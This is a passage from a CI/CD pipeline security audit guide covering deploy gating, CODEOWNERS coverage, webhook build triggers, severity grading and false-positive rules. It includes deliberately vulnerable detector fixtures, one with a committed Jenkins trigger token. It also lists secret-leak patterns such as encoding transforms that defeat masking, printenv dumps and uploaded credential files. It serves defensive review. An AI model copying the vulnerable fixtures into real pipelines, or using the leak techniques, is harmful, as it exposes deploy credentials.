      - trivy image --exit-code 1 --severity HIGH,CRITICAL "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA"
```

### 15. What stands between a merge and production (`privileged-deploy-gate`)

Most of this item's real controls are provider settings, so the discipline is to report what the files show and convert the rest into questions. Doing otherwise in either direction is how this item goes wrong.

- **Is a deployment environment referenced at all?** An `environment:` key on the deploy job is the hook that protection rules attach to. Its absence means there is no gate to configure, which *is* a repository-visible finding. Its presence means a gate is referenced — required reviewers, wait timers and branch restrictions are settings behind the name, so ask.
- **What the deploy job's condition actually allows.** `if: github.ref == 'refs/heads/main'` restricts the ref and nothing else; combined with a `workflow_dispatch` trigger it lets anyone with write access deploy at will. A manual approval step (`environment:` with reviewers, a GitLab `when: manual` on a protected environment, a Jenkins `input` step) is the control to look for.
- **Who can change the pipeline.** This is the escalation path that gets missed: if `CODEOWNERS` does not cover `/.github/workflows/` and `/.github/actions/`, a contributor can modify the deploy pipeline in the same pull request that changes application code, and the pipeline change is reviewed by whoever reviews the application code. **`CODEOWNERS` is last-match-wins, and a bare `*` rule matches `.github/workflows/**` like everything else** — so "an owner exists for this path" is never the question. Compute the *effective* owner: the last rule in the file that matches `/.github/workflows/…`. A file whose only matching rule is `*` gives the pipeline the same reviewers as application code, which is the finding; so does an explicit `/.github/` entry naming the application team. What you are looking for is a rule more specific than `*` whose owner is a team that would notice a workflow change.
- **Release and tag gating.** A workflow triggered by any pushed tag, in a repository without tag protection, is a deploy anyone with write access can start by pushing a tag. Report the workflow shape and put tag protection in the assumptions list.
- **Credential separation by environment.** One set of deploy credentials shared across staging and production means the staging pipeline can deploy production. Read the secret names per job.
- **Provider notes.** GitLab protected environments and protected branches are settings; a `.gitlab-ci.yml` `environment:` block plus `when: manual` is the repository-visible half. Jenkins folder-based authorization, script approval and non-root build agents are controller configuration — ask, and note that anonymous read access on a Jenkins controller exposes build logs and therefore secrets.

```detector
match: |
  # .github/workflows/deploy.yml
  on:
    workflow_dispatch:
    push:
      branches: [main]
  jobs:
    deploy-prod:
      runs-on: ubuntu-24.04
      steps:
        - run: ./scripts/deploy.sh production
          env:
            PROD_DEPLOY_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}
nomatch: |
  # .github/workflows/deploy.yml
  on:
    workflow_dispatch:
    push:
      branches: [main]
  jobs:
    deploy-prod:
      runs-on: ubuntu-24.04
      environment: production
      steps:
        - run: ./scripts/deploy.sh production
          env:
            PROD_DEPLOY_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}
```

```detector
match: |
  # .github/CODEOWNERS
  *               @example-org/app-team
  /docs/          @example-org/docs-team
nomatch: |
  # .github/CODEOWNERS
  *               @example-org/app-team
  /docs/          @example-org/docs-team
  /.github/       @example-org/platform-security
  /.github/workflows/  @example-org/platform-security
```

The `nomatch` half is not proof of a control — `CODEOWNERS` coverage only bites if review is required and cannot be bypassed, which is a setting. It is the necessary condition, and its absence is the finding.

### 16. Build triggers reachable from outside the trust boundary (`unauthenticated-build-trigger`)

- **On a hosted forge, the reachable triggers are the ones in item 1.** `pull_request_target`, `issue_comment`, `issues` and `discussion_comment` can be initiated by any account, and fork pull requests can start a run unless the repository requires approval first (a setting — ask). By contrast `workflow_dispatch` and `repository_dispatch` require write access or a token, so they are not "unauthenticated" on their own; the question for them is who holds the token, which is item 3.
- **Committed webhook trigger tokens.** A CI system that starts a build when a URL is called, with the token for that URL in the repository, is a build anyone who can read the repository can start — and on a public repository, anyone at all. Grep pipeline definitions for literal token strings and for trigger configuration that names one.
- **Self-hosted CI reachable without authentication.** Anonymous read access on a controller exposes build logs, and therefore secrets, and often exposes a build button. Whether it is enabled is controller configuration, so ask; what the repository can show is whether the pipeline assumes an authenticated trigger.
- **Cross-project token use.** A pipeline that authenticates to another project with the CI system's own job token widens the blast radius of any build in either project. Whether the token's allowlist is configured is a project setting.
- **The consequence to state, once.** For every reachable trigger, name what a run of it can do: which secrets are in scope, whether the token can write, and whether the runner is shared. A reachable trigger on a job with nothing to steal and no write access is Info; the same trigger on a job with a publish token is at the top of the table.

```detector
match: |
  // Jenkinsfile
  pipeline {
    agent { label 'build' }
    triggers {
      GenericTrigger(
        genericVariables: [[key: 'ref', value: '$.ref']],
        token: 'deploy-prod-2019',
        causeString: 'Triggered by webhook'
      )
    }
    stages { stage('Deploy') { steps { sh './scripts/deploy.sh production' } } }
  }
nomatch: |
  // Jenkinsfile
  pipeline {
    agent { label 'build' }
    triggers {
      GenericTrigger(
        genericVariables: [[key: 'ref', value: '$.ref']],
        tokenCredentialId: 'generic-webhook-token',
        causeString: 'Triggered by webhook'
      )
    }
    stages { stage('Deploy') { steps { sh './scripts/deploy.sh production' } } }
  }
```

### Publicly reported incidents cited above

Each of these is an illustration of one mechanism, with the date it was reported. None of them is a finding, and none of them should be cited as a current threat inventory.

| Incident | What actually happened | The control it argues for |
|---|---|---|
| SolarWinds (2020) | Build-system compromise injected code into a legitimately produced binary. | Build-environment isolation, provenance attestation, independent rebuilds. |
| Codecov (2021) | A bash uploader script fetched at build time was modified upstream and exfiltrated CI environment variables. | Pinning fetched scripts by hash; restricting egress from CI. |
| Dependency confusion (2021) | Internal package names registered on public registries resolved ahead of the internal ones. | Scoped names and explicit single-index registry configuration (item 7). |
| ua-parser-js, coa, rc (2021) | Maintainer account takeovers published malicious versions through legitimate accounts. | Quarantine window before ingestion, lockfile and integrity pinning, `--ignore-scripts`, install-time egress restriction. **Not** signing — the malicious releases were validly published. |
| Machine-learning framework nightly build (2022) | Dependency confusion against an internal package name on the public index. | Explicit index priority; `--index-url` rather than `--extra-index-url`. |
| 3CX (2023) | A trojanized third-party installer led to build-environment compromise; what shipped was a **validly signed** application side-loading malicious DLLs. It was **not** a package-manager dependency backdoor, and signing did not help. | Build-environment isolation and hermetic builds; verifying what actually ships (reproducible builds, bit-for-bit comparison against inputs) — because a signature attests to the publisher, not to the build. |

## Severity calibration

`severity_floor: low` is presentational. It orders this lens's findings in the report. It never suppresses a finding, and no item above may be dropped because it lands at Low or Info.

**Three rules do most of the work here.**

- **No unconditional High.** Every High and Critical below names the artifact that establishes its condition — a trigger keyword, a workflow key, a file glob, a flag. A condition no artifact in the checkout can satisfy does not make the lens cautious; it downgrades every instance of that finding forever, which is worse than having no rule.
- **A provider setting is not a grade.** Where the deciding fact is branch protection, repository visibility, runner ephemerality, environment approvers or token defaults, the output is the finding at the grade the *files* support, plus the assumption and the verification step. Never grade the unknown as if it were known, in either direction.
- **This lens does not classify data.** Whether the pipeline touches personal data or ePHI is `personal-data-severity-uplift` and `phi-severity-uplift`, owned elsewhere. Grade the pipeline defect on its own terms and let the uplift come from the lens that owns the classification.

### The re-graded instructions

The severity guidance this lens inherited contradicted, in seven places, the false-positive material it also inherited. An auditor faced with a table row and a suppression rule that disagree follows the row — it is the one with a number in it — so correcting only the prose would have left every one of these operational. Each row below is the corrected version, and the corresponding false-positive entry has been reconciled to it.

| Inherited instruction | Why it was wrong | Re-graded |
|---|---|---|
| "`pull_request_target` checking out PR code with secret access: **Critical**." | The "with secret access" clause reads as a required third leg, and the canonical case satisfies it only implicitly — `pull_request_target` + checkout of the head + `npm ci` references no secret at all. Requiring a literal `secrets.*` hit silently clears the most common instance. | **Critical** on two legs: a privileged trigger *plus* pull-request-controlled content checked out or executed. The base-context token is present regardless, and `actions/checkout` persists it into `.git/config` by default. `secrets.*`, `id-token: write` and a write-scoped `permissions:` block are **aggravators**, not preconditions. **High** where the trigger is privileged and PR text is interpolated but no PR content is executed. |
| "Self-hosted runner on public repo: **Critical**." | Neither half is repository-visible: runner ephemerality is runner configuration and visibility is a repository setting, so an unconditional Critical fires on every ephemeral just-in-time runner in every private repository. | **Critical** for a **persistent** runner reachable by an arbitrary fork pull request, or one holding cloud credentials, a Docker socket or a shared toolcache. **Medium** for a runner documented as ephemeral or just-in-time, framed as approval-policy and ephemerality drift. Where neither fact is available, grade **Medium** and write both assumptions with the verification step. |
| "Workflow injection via PR title/body: **Critical** (RCE on CI)." | Correct for the injectable contexts and wrong for the two-thirds of `${{ }}` occurrences that are not — grading `github.sha` or `github.run_id` as injection produces a report the team stops reading. | **Critical** where an attacker-controlled context from the injectable list reaches a shell (`run:`, `script:`, `sh "…"`) *and* the job holds a secret or a write token. **High** where it reaches a shell in a job with neither. **Not a finding** for the constrained contexts in item 1d, or for a value passed through `env:` and referenced as a quoted variable. Writing untrusted text into `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH` is graded on the same scale as `run:` interpolation, because it reaches the same shell one step later. |
| "Action pinned by tag (not SHA) for a security-relevant action: **High**." | "Security-relevant" is undefined, so in practice it fires on everything — including local `./` actions and same-repository reusable workflows, where a SHA adds nothing. | **High** for a third-party action on a mutable ref in a job that holds a publish token, a cloud credential or a write-scoped token. **Medium** for a third-party action on a mutable ref elsewhere. **Low** for a first-party `actions/*` or `github/*` reference on a major tag. **Not a finding** for `./` local actions or same-repository reusable workflows — *except* where the workspace holds untrusted content, which is the Critical in row 1. |
| "Secrets logged in plaintext / unmasked: **High to Critical** depending on what." | "Depending on what" carries no decision procedure, and the same row was being applied to secrets appearing under a step's `env:`, which is the prescribed mitigation. | **Critical** for a credential that grants publish or deploy rights, or a long-lived cloud key, disclosed by a step in the checkout — including via a transform that defeats masking (`base64`, `xxd`, JSON, `jq`) or an artifact/cache path that captures a credential file. **High** for a scoped or short-lived token. **Not a finding** for `${{ secrets.X }}` bound under a **step-scoped** `env:`, and a **quoting nit** for one inline in a `run:` string. The clearance stops at step scope: the same secret bound at **workflow or job scope** in a file that installs or builds untrusted content is in the environment of the step that runs it, and is graded on the row below. |
| "No lockfile / no `npm ci` equivalent: **Medium** standalone, **High** if combined with private package use." | Names one ecosystem's verb as the standard, so it fires on every pnpm, uv, cargo, bundler and composer repository, and it grades library authors for publishing ranges deliberately. | **Medium** where a lockfile exists and CI installs past it (`npm install` where `package-lock.json` is committed; a `Dockerfile` that copies the manifest but not the lockfile). **High** where that repository also resolves an internal package name from a configuration that permits public fallback (item 7). **Not a finding** where a frozen-install verb from item 6 is present in that ecosystem, nor for a published library's ranged direct dependencies. For Go, not a finding at all unless a value in the `GOSUMDB`/`GOFLAGS` family turns the default off. |
| "No branch protection on main: **High** for production repos." | Not determinable from a repository at any severity, so as written it is either fabricated or silently dropped. | **Removed as a finding.** Report it as an assumption with the verification step, and grade the repository-visible neighbours instead: `CODEOWNERS` covering `/.github/workflows/` with nothing more specific than `*`, or with the same owner as application code; a deploy job with no `environment:` reference; a release workflow triggered by any pushed tag. Those three are findable and are what an absent protection rule actually lets an attacker do. |

Two rows are preserved from the inherited guidance because they were already right: **postinstall scripts allowed for all dependencies — Medium**, and **long-lived cloud credentials instead of federated identity — Medium to High**. The second is sharpened below with the artifact that decides between the two.

### Severity table

| Finding | Severity | Condition that earns it |
|---|---|---|
| Privileged trigger executing pull-request-controlled content | Critical | A trigger from item 1a's list, plus a checkout of `head.sha`/`head.ref`/`refs/pull/N/merge`/`workflow_run.head_sha`, a `gh pr checkout`, or execution of a file from a workspace holding PR content — both quoted with file and line. No `secrets.*` reference is required. |
| Attacker-controlled context reaching a shell in a job holding a secret or write token | Critical | The context is on item 1d's injectable list, the `run:`/`script:`/`sh` line is quoted, and the secret or `permissions:` grant in that job is quoted. Includes untrusted text appended to `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH`. |
| `ACTIONS_ALLOW_UNSECURE_COMMANDS` enabled | High | The literal appears in a workflow `env:` block. Any logged line can then set an environment variable for later steps. |
| Persistent self-hosted runner reachable by an untrusted pull request | Critical | `runs-on` names a self-hosted label, the workflow's trigger is fork-reachable, and one of these is established: the runner is not ephemeral, it holds cloud credentials, a Docker socket is mounted, or a toolcache is shared. Ephemeral and unestablished cases are Medium with the assumption written out. |
| Host Docker socket or privileged container in a build job | High | `/var/run/docker.sock` mounted, or `privileged: true` on a build service, quoted. **Critical** where the same job can be reached by an untrusted trigger. |
| Publish or deploy credential disclosed by a step in the checkout | Critical | The disclosing line is quoted — a log of the value, a masking-defeating transform, an `env`/`printenv` dump, or an artifact/cache path that captures a credential file — and the credential's scope is named. For an **`actions/upload-artifact`** path, one more element is required, because hidden files are excluded by default from **v4.4.0**: quote `include-hidden-files: true`, or a pin/tag resolving older than v4.4.0, or a **non-hidden** credential inside the uploaded tree (`*.pem`, `*.key`, `id_rsa`, `credentials.json`, `kubeconfig`, `settings.xml`). `actions/cache` paths and other providers' artifact globs (GitLab `artifacts: paths`, CircleCI `store_artifacts`) need no such element — they have no hidden-file default. |
| Secret bound at workflow or job scope in a file that installs or builds untrusted content | Critical | The `env:` block's scope is quoted **by its parent key** — workflow level, or under `jobs.<id>:` rather than inside a `steps:` item — and never by its column count, because four-space YAML puts a job-level `env:` at column 8 where a two-space file puts a step-level one, so a column rule clears this row outright on half of all repositories. **And** the step in that scope that executes pull-request-controlled content is quoted — an install that runs lifecycle scripts, a build, a linter loading PR-supplied plugins. No log line, no transform and no `${{ }}` is required: the value is in the process environment of the untrusted code. **High** where the secret is scoped or short-lived. **Not a finding** where the binding sits on a step that does not execute untrusted content — that is item 1d's prescribed fix. |
| Long-lived cloud credential used where federated identity is available | High | The credential-configuring step is quoted, the provider's federated action is available for that provider, and the job deploys or mutates infrastructure. **Medium** where the credential is read-only or scoped to a single non-production resource. |
| `id-token: write` at workflow level in a file that also builds untrusted content | High | The workflow-level `permissions:` block and the untrusted-content job are both quoted. **Medium** where no job in the file handles untrusted content. |
| Third-party action on a mutable ref in a job holding a publish or cloud credential | High | The `uses:` line and the credential are both quoted. Medium/Low per the re-graded table elsewhere. |
| Internal package resolvable from a public index | High | An unscoped internal dependency name is quoted from the manifest, *and* the resolution configuration permitting fallback is quoted (`--extra-index-url`, `PIP_EXTRA_INDEX_URL`, a non-`explicit` Poetry source, a bare npm `registry=` with no scope binding). Whether the name is registered publicly is the user's follow-up, and its absence does not reduce the grade. |
| Install command naming a package absent from the manifest and lockfile | Medium | The command is quoted and the manifest is shown not to contain the name. **High** where it runs in a job holding a publish credential. |
| Lifecycle scripts permitted during an install in a job holding a publish credential | Medium | The install command and the credential are quoted, and the control is shown to be absent **by value, not by key**: `.npmrc` has no `ignore-scripts=true` (a committed `ignore-scripts=false` is the control switched off and still earns the row), and no `--ignore-scripts` on the command. For **pnpm**, quote the resolved major as well — `packageManager`, the `pnpm/action-setup` `version:` input or `pnpm-lock.yaml`'s `lockfileVersion` — because pnpm ≥ 10 blocks dependency scripts by default while pnpm ≤ 9 runs them; the finding on pnpm ≥ 10 is an `onlyBuiltDependencies` entry covering a package that need not build. Not reducible by an unverifiable claim about container ephemerality or egress. |
| Automated dependency merge with no quarantine window | Medium | An automerge setting is quoted and no minimum-release-age setting is present in the same configuration. |
| End-of-life runtime or toolchain in the pipeline | Medium | The version is quoted from a `setup-*` input, a version file, `go.mod`, or a pipeline image tag, and its support status is stated. |
| Scanner present but unable to block | Medium | The soft-fail artifact is quoted: `continue-on-error: true`, `\|\| true`, `allow_failure: true`, a soft-fail flag, a zeroed exit code, or a trigger that cannot run on a pull request. **Low** where the only issue is that the required-check setting could not be verified. |
| Scanner fails open on a dependency it consults | High | The fetch-then-scan sequence is quoted **plus a construct from item 14's measured list**, because the runner's default `run:` shell is already `bash -e {0}` and most of the constructs auditors reach for here are inert under it: a `curl` with no `-f`/`--fail` (a 404 body lands in the output file and exits 0), a fetch that returns 200 with an empty or unparseable body and no content assertion, a pipe whose *last* command succeeds with `pipefail` off (`\| sh`, `\| tee`), an `export`/`declare`/`local`/prefix assignment or an `echo "$( … )"` wrapping the fetch, `\|\| true`, `continue-on-error: true` on the fetch step, or a cached database with no freshness check. **Three near-misses do not earn this row and must not be quoted for it:** a missing `set -e` (on by default), a **bare** `V=$( … )` assignment, and a `;`-joined list — `-e` aborts on all three, measured. `; exit 0` earns it only where the step's shell is not started with `-e`. Recipe R6 proves it. |
| No advisory scanning of dependencies anywhere in the pipeline | Medium | Established by enumerating the workflow set and finding no scanner invocation and no dependency-update configuration. |
| Deploy job with no environment reference and no approval step | Medium | The deploy job is quoted and no `environment:` key, manual-approval step or equivalent gate appears in it. Required reviewers behind an existing `environment:` name are a setting — ask. |
| `CODEOWNERS` does not cover the pipeline directory | Medium | The `CODEOWNERS` file is quoted and **no entry more specific than `*` matches `/.github/workflows/`**, *or* the effective last-matching owner for that path is the same team that owns application code. `CODEOWNERS` is last-match-wins and a bare `*` rule *does* match every workflow file, so "contains no entry matching the path" would clear a file whose only rule is `*` — which is the common case and the finding. Quote the winning rule and the owner it resolves to. **Low** where no `CODEOWNERS` file exists at all, because there is then no partial control to defeat — report the absence plainly. |
| Committed webhook trigger token, or a build trigger reachable without authentication | High | The token literal or the trigger configuration is quoted, and what a run of it can reach is named. **Critical** where that run deploys or holds a publish credential. |
| No signing or provenance emission for a publicly published artifact | Medium | The publish step is quoted and no signing, `--provenance`, attestation or generator step exists in the release path. **Low** for an artifact consumed only inside the organization. |
| Keyless `cosign verify` whose identity constraint does not constrain | High | The invocation is quoted, it is **keyless** (no `--key`, no `--certificate-chain` — those modes are exempt because the identity flags do nothing there), and one of these is quoted with it: an unanchored or wildcarded identity pattern (`--certificate-identity-regexp '.*'`, no `^`, a wildcard in the org position), `--insecure-ignore-tlog`, `--insecure-ignore-sct`, or a cosign **1.x** pin together with missing identity flags. In each case the step succeeds against artifacts it should reject, so the pipeline's own control is inoperative. **Medium** for missing identity flags on cosign **≥ 2.0**, where the command errors instead: the finding is then a gate that cannot pass, so quote whatever hides it (`\|\| true`, `continue-on-error: true`) or report the pipeline as broken. |
| Release checksums published without a signature over the checksum file | Low | The release step is quoted. Whoever can replace the artifact can replace an unsigned checksum, so this is a hygiene finding rather than a control gap. |
| No SBOM, or an SBOM that reaches no consumer | Low | The generation step (or its absence) is quoted along with the absence of an upload, release asset or attestation. **Medium** where a customer or a regulation consumes the artifact. |

### Anti-patterns, stated as rules

- **Never grade on a keyword alone.** `pull_request_target`, `self-hosted`, `${{ }}`, `curl | sh`, `npm install` and `continue-on-error` are candidates. The grade comes from the second leg: what content is executed, what credential is in scope, what the runner is, whether a gate exists.
- **Never clear a finding because a control might exist in the provider, and never assert one because it might not.** Branch protection, secret masking, cache isolation, runner ephemerality and organization token defaults are all real and all invisible here. Both directions need evidence; absent it, the finding stays open at the lower grade with the assumption and the verification step written out.
- **Never accept a signature as evidence about a build.** It attests to a publisher. Provenance and reproducibility attest to a build. Two rows, two findings.
- **Do not double-file across the boundary.** The cloud trust policy, the base image's contents, admission-time signature enforcement and a committed credential literal each belong to another lens. The aggravator goes in `impact`, and the other lens gets the file and the line.
- **Do not import a severity from a category name.** `A03:2025` is not a severity, a SLSA level is not a severity, and neither is "Critical" in a scanner's output.

## Known false positives

Each entry names a pattern a competent reviewer would flag and states why it is not the finding it looks like. **None of these is a licence to drop a finding:** every one names the narrower finding that does survive, and each is reconciled with the severity row that grades it.

1. **`pull_request_target` in a workflow that never checks out or executes pull-request-controlled content.** Labelers, welcome bots, size labels, backport and triage bots, and stale-issue sweeps use it precisely because they need write access on a fork pull request. `pull_request_target` checks out the *base* ref by default, and the privileged context is dangerous only when pull-request content is executed or interpolated. **What survives, and it is the larger half:** flag on the trigger **plus** any one of — a checkout of `head.sha`, `head.ref`, `refs/pull/N/merge`, a `gh pr checkout`, or a `git fetch origin pull/N/head`; a `${{ github.event.pull_request.* }}` value inside `run:`; a `uses: ./…` local action resolved from the checked-out tree; or a step that reads or executes pull-request-supplied configuration — a linter resolving plugins from the PR's config, an install against the PR's lockfile, a `Makefile` target, a build wrapper script, a pre-commit run, a container built from the PR's Dockerfile, or a cache restored on a key derived from PR content. Conversely, a `pull_request_target` job that checks out the pull-request head and then installs dependencies is a **real Critical even with no `${{ }}` anywhere**, and no `secrets.*` reference is needed to earn it.

2. **`${{ … }}` inside `run:` where the context is not attacker-controlled.** `github.sha`, `github.run_id`, `github.run_number`, `github.repository`, `github.repository_owner`, `github.actor`, `github.job`, `github.workflow`, `github.event.number` / `github.event.pull_request.number`, `vars.*`, and `workflow_dispatch` inputs typed `choice` or `boolean` come from a constrained character set or from repository-owner-controlled configuration: usernames and repository names cannot contain shell metacharacters, SHAs and run identifiers are hex or numeric, and the provider validates a `choice` against its declared options. **What survives:** the injectable set in item 1d, which is small and specific, plus two carve-outs that this entry does **not** clear. First, it clears these contexts *for interpolation into a shell only* — `github.actor` is not an authorization control, and a job that gates on `github.actor == 'some-bot'` is a trust decision to examine on its own. Second, it says nothing about `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` writes whose value comes from a command substitution rather than from `${{ }}` — a raw commit subject appended to `$GITHUB_ENV` has no expression on the line and is fully injectable.

3. **A `pull_request`-triggered (not `_target`) workflow that checks out `${{ github.event.pull_request.head.sha }}`.** Checking out the pull-request head is the entire point of a `pull_request` workflow, and for a **fork** pull request on a **public** repository the "has access to secrets" half cannot be satisfied: secrets are not sent to the runner, `GITHUB_TOKEN` is read-only, and `${{ secrets.X }}` evaluates empty. **That is a default, not an invariant, and the exception is a repository setting rather than anything in the checkout.** On a **private or internal** repository, "Send secrets to workflows from fork pull requests" and "Send write tokens to workflows from fork pull requests" make both halves false, and this entry then clears a full compromise. So the clearance is conditional: invoke it only where the repository is confirmed **public**, or where those two settings are confirmed off. Otherwise report the finding at the grade the files support with both settings written out as the assumption and the verification step — see *What cannot be determined from a repository*. **What survives even under the clearance — four residual risks, named specifically rather than gestured at:** a **same-repository branch** pull request, where secrets *are* available and the token *is* writable, so a lower-trust collaborator's branch gets the full privileged context; a cache or artifact written by this run and consumed later by a `workflow_run` or release job (items 1b and 2); a self-hosted runner, where fork code executes on your hardware regardless of secrets; and a pull-request-triggered job that itself calls out to a third-party service with a credential the fork can influence. Check which of the two pull-request flavours the repository actually receives before invoking this entry.

4. **`uses:` references that are not 40-hex SHAs but are nonetheless controlled.** Local actions (`uses: ./.github/actions/build`), same-repository reusable workflows, and bot-written pins of the form `@a1b2c3d… # v4.1.1` — the last of which auditors routinely misread as a tag reference when the ref is already a SHA and the version is a comment. Local and same-repository references inherit this repository's own review controls, so a SHA adds nothing. **What survives, and two of these are the reason this entry is dangerous as written:** a local `uses: ./…` reference in a job whose workspace holds untrusted content resolves the action out of the pull request's tree and is a **Critical**, not an exemption; a reference to another repository in the same organization is governed by *that* repository's controls, not this one's, and is not exempt; a mutable reference *inside* an otherwise-pinned action's own `action.yml`; a `docker://` action or a `container:` image on a tag; and the calibration point that a 40-hex pin proves immutability and not benignity.

5. **"No lockfile" or "not using `npm ci`."** Library authors publish ranged dependencies deliberately — a consumer never reads the library's lockfile, so the reproducibility argument applies only to the library's own CI. And `npm ci` is one of many equivalents: `yarn install --immutable`, `pnpm install --frozen-lockfile`, `uv sync --frozen`, `bundle install --deployment`, `cargo build --locked` and `dotnet restore --locked-mode` are all frozen installs, so flagging "no `npm ci`" in a pnpm, uv or cargo repository is a pure false positive. Go is a further special case: `go.sum` plus the public checksum database already provides transparency-log-backed integrity, so "no hash pinning" is wrong for Go unless a value in the `GOSUMDB`/`GOFLAGS`/`GOPRIVATE` family turns it off or widens it — `GOSUMDB=off` and `GOFLAGS=-mod=mod` are the confirmed bypasses, and the finding is what a value covers, never that a variable is present. **What survives:** a lockfile that exists and is not installed from (`npm install` in CI, a `Dockerfile` that copies the manifest but not the lockfile, a CI step that regenerates the lock); an *application* — not a library — with ranged dependencies and no lockfile at all; and pip installs with neither hashes nor a fully pinned input file. Tell library from application by evidence: a published package name plus `files`/`main`/`exports` says library, a `Dockerfile` and a deploy workflow say application, and a monorepo can contain both.

6. **A workflow with no `permissions:` block, or `contents: write` in a release job.** Repositories and organizations created after **February 2023** default `GITHUB_TOKEN` to read-only, and an administrator can enforce that organization-wide — none of which is visible in a workflow file, so a missing block is not evidence of excess privilege. And a release workflow that pushes tags, publishes packages or mints federated tokens legitimately needs `contents: write`, `packages: write` and `id-token: write`. **What survives:** report a missing block as **Low** hardening against organization-policy drift, with the token default written as an assumption and a verification step — never as a clearance, because a repository created before the default changed still has a permissive token and nothing in the checkout distinguishes the two. Reserve **High** for a demonstrably write-scoped token in a job that handles untrusted input, and note that this entry does not reach `permissions: write-all`, which is an explicit grant rather than a default, nor `id-token: write` declared at workflow level in a file that also builds untrusted content, nor a personal access token used in place of `GITHUB_TOKEN` — the February 2023 default does not apply to any of those.

### Rejected candidates

Candidates considered for the list above and deliberately excluded. Nothing here should be quietly re-added: each would have suppressed a real finding, or moved a finding into a section that cannot enforce it.

- **"`curl … | sh` in a build step."** Cut as a suppression rule. When pinned, checksum-verified and run in a digest-pinned ephemeral container it has the same trust structure as an official setup action or a distribution package — but as a false-positive entry it teaches a reader to skip the unpinned case, which is the common one. The real discriminators live in item 2 as checklist text instead: the URL points at `latest`/`main` or an unversioned installer path, no checksum or signature is verified, secrets are in the environment during the fetch, and there is no `set -o pipefail`.
- **"Dependency lifecycle scripts allowed during install."** Rejected **as written**, because the operative clause was "not a finding when the install runs in an ephemeral container with no credentials and restricted egress" — three properties that cannot be verified from a workflow file, and whose acceptance waves away a genuine malicious-postinstall path. Only the checkable half is kept, as a checklist note in item 9: check `.npmrc` for `ignore-scripts=true` before filing — the *value*, since `ignore-scripts=false` is a legal opt-out that a key-presence grep misreads as the control — know that the flag breaks native-build and browser-download packages, and know that **pnpm 10 and later** gate dependency scripts behind `onlyBuiltDependencies` while **pnpm 9 and earlier do not**, so the pnpm clearance requires the resolved major.
- **"`runs-on: self-hosted` in a public repository with ephemeral or just-in-time runners."** Not a false positive; a severity downgrade, and it belongs in the calibration table where it now is (Critical → Medium, framed as approval-policy and ephemerality drift). As a suppression entry it would have cleared the case that matters, because ephemerality is a claim about runner configuration that the repository cannot evidence. Critical is retained for a persistent runner an arbitrary fork pull request can reach, or one holding cloud credentials, a Docker socket or a shared toolcache.
- **"Secrets passed via `env:`, and secret-looking identifiers in workflow files."** Split rather than kept, **and scoped**. The identifier half is `hardcoded-credentials-and-key-material` and belongs to the crypto lens. The strong half is a self-contradiction to fix in this lens's own text rather than a suppression: a **step-scoped** `env:` is the prescribed injection mitigation, so *that* binding can never be cited as "secret exposure", and `${{ secrets.X }}` inline in a `run:` string is a masking and quoting nit. Written without the scope qualifier the entry becomes a blanket clearance that drops a real Critical, so it is not: a workflow- or job-scoped `env:` in a file that installs or builds untrusted content is an exposure with its own row (item 3). The real leak list stays in item 3 — a logged or `set -x`-expanded secret, transforms that defeat masking, `env`/`printenv` dumps, an over-broad artifact or cache path, and caching a credential file.
- **"No SBOM / no provenance."** Severity calibration, not suppression: Low or informational for an internal-only service that ships no third-party artifact, rising where a customer or a regulation consumes the artifact. Written as a false positive it would clear the case where a *publicly published* package emits neither.
- **"Delete branch on merge is not enabled."** Struck from this lens entirely rather than suppressed. A stale merged branch grants no access and is not executed, and deleting branches can destroy investigation evidence. It was hygiene advice masquerading as a control.
- **"`${{ … }}` inside an `if:` condition is safe because `if:` is not a shell."** Rejected as a suppression even though the literal statement is true. It reads across to `run:` on the next line, and it obscures the real `if:` questions — a trust gate built on a spoofable or wrong context, and a condition that fails open. The accurate version is one clause in item 1d.
- **"Secrets are masked in logs by the provider, so a logged secret is not a finding."** Rejected. Masking is provider behaviour this audit cannot verify, it is exact-string based, and every transform in item 3 defeats it by construction. Accepting it would clear the entire secret-leakage class on an unverifiable premise.
- **"The repository is private, so a self-hosted runner is fine."** Rejected as written. Visibility is not in the checkout, private repositories still have lower-trust collaborators and fork pull requests from internal forks, and a persistent runner is a lateral-movement asset regardless. Visibility is a severity input recorded as an assumption, never a clearance.
- **"The action is pinned to a 40-hex SHA, so the dependency is safe."** Rejected outright. A pin proves immutability, not benignity, and reviewing what the pinned commit does is manual work no automated check replaces. It is recorded in *What cannot be determined from a repository* so the limit is visible instead of being used as a clearance.
- **"`npm audit` (or the equivalent) reports no advisories, so the dependencies are fine."** Rejected. Advisory databases lag, they do not cover unreported malicious packages, and a clean scan says nothing about resolution configuration, squatting, lifecycle scripts or abandonment. A clean scan is one input, reported as such.
- **"Branch protection and secret scanning are configured at the organization level, so their absence in the repository is not a finding."** Rejected as unverifiable, in the same direction and for the same reason as any "an equivalent control probably exists elsewhere" rule. It cannot be checked from a checkout and it would clear the case where nothing enforces them anywhere. The verifiable half is in Scope, under what cannot be determined: report what the files show, name the setting as an assumption, and give the verification step.
- **"First-party `actions/*` references need no review, so an unpinned first-party action is not a finding."** Rejected as a suppression and kept as calibration (Low). Written as a false positive it invites the same reasoning about any large vendor's action, which is exactly the population a tag-retargeting compromise draws from.

## Proof recipes

Shared harness components are referenced by name and not restated here: the **detector-and-fixture-pair runner**, the **canary fixture set** and the **local log and artifact collector**. Their implementations live in `lenses/_harness.md`.

**Tier rule.** T1 is a proof the repository's own test command executes. T2 requires the auditor to stand up infrastructure the repository does not, and the user is asked every time. **One resolution is load-bearing for this lens's severities:** a static checker executed by the repository's test runner, asserting that it flags a deliberately vulnerable fixture *and* does not flag a clean one, **is** an executed repository-local test and counts as **T1**. Without that resolution almost every finding in this lens caps at Medium once the hard rails remove the dynamic half, and the lens systematically under-rates its own most dangerous domain.

**Hard rails, and this lens is the one that most often violates them.** No recipe here touches a host the repository does not start. Specifically and non-negotiably: **never open a real pull request against a hosted forge**, never send a canary to a request-bin or any third-party collector, never force-move a tag in a real organization, never call the CI provider's API to download logs or artifacts from a real run, and never query a package registry. Every one of those appeared in inherited recipes, and two exfiltrated a sentinel. Live-pipeline evidence stays outside this lens and repository-proof workflow and may use only the canonical skill's separately authorized external controller.

### R1 — Detector-and-fixture-pair policy tests over pipeline definitions (T1)

